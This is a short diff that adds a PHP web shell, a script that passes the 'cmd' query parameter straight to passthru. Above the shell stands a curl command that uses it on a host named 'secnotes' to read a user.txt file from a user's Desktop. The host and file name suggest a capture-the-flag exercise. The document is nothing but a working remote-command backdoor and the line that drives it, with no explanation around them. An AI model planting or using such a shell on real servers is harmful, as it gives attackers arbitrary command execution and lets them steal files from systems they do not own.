@@ -1,0 +1,10 @@
+curl http://secnotes:8808/test.php?cmd=more+%5cUsers%5ctyler%5cDesktop%5cuser.txt
+
+<?php
+header('Content-Type: text/plain');
+$cmd=$_GET['cmd'];
+
+$output = passthru($cmd);
+echo $output;
+?>
+
